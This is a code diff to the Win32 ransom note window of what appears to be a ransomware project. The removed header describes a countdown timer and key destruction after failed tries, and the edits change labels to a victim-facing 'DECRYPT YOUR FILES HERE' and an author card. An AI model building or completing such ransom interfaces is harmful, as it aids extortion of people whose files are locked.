@@ -1,9 +1,7 @@
-/* =================================================================
- * ransomnote.c  —  Native Win32 Ransom Note Window
- *   + 24-hour countdown timer (starts immediately)
- *   + 10-try decryption limit (key destroyed on failure)
- *   + Minimize / Maximize buttons
- * ================================================================= */
+/* 
+ * ransomnote.c  —  Native Win32 Ransom Note Window */
+
+
 #include <windows.h>
 #include <commctrl.h>
 #include <stdio.h>
@@ -227,23 +225,24 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
 
         CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
             0, 0, 5, 85, hCard, NULL, hInst, NULL);
-
-        CreateWindowExW(0, L"STATIC", L"SECURITY RESEARCHER",
+        
+        CreateWindowExW(0, L"STATIC", L"About Author",
             WS_CHILD | WS_VISIBLE, 20, 8, 300, 18, hCard, NULL, hInst, NULL);
-
+        
         CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
-            WS_CHILD | WS_VISIBLE, 20, 28, 500, 32, hCard, NULL, hInst, NULL);
-
+            WS_CHILD | WS_VISIBLE, 20, 32, 500, 32, hCard, NULL, hInst, NULL);
+        
         CreateWindowExW(0, L"STATIC",
             L"Cybersec Engineer  |  Hacker  |  Malware Researcher",
-            WS_CHILD | WS_VISIBLE, 20, 62, 500, 20, hCard, NULL, hInst, NULL);
+            WS_CHILD | WS_VISIBLE, 20, 63, 500, 20, hCard, NULL, hInst, NULL);
 
+        
         /* ── Decryption Section ── */
         HWND hDecryptPanel = CreateWindowExW(0, L"STATIC", NULL,
             WS_CHILD | WS_VISIBLE | SS_NOTIFY,
             30, 460, 800, 130, hWnd, NULL, hInst, NULL);
 
-        CreateWindowExW(0, L"STATIC", L"\u26A0  DECRYPTION UTILITY",
+        CreateWindowExW(0, L"STATIC", L"\u26A0  DECRYPT YOUR FILES HERE: ",
             WS_CHILD | WS_VISIBLE, 15, 5, 300, 22, hDecryptPanel, NULL, hInst, NULL);
 
         CreateWindowExW(0, L"STATIC",
